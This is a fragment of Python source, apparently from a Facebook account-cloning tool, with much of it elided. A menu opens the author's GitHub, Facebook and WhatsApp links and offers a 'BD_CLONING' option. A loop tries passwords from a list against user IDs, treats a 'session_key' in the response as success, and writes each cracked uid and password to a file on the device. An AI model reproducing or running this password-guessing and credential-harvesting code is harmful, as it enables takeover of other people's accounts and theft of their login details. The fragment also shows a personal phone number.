...
def TARA_LOVE():
    clear()
    os.system('xdg-open https://github.com/Abdullahalmafi')
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://www.facebook.com/profile.php?id=61553548716627');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://wa.me/+8801871225695');time.sleep(1)
    else:
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    open('/sdcard/MAFI-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
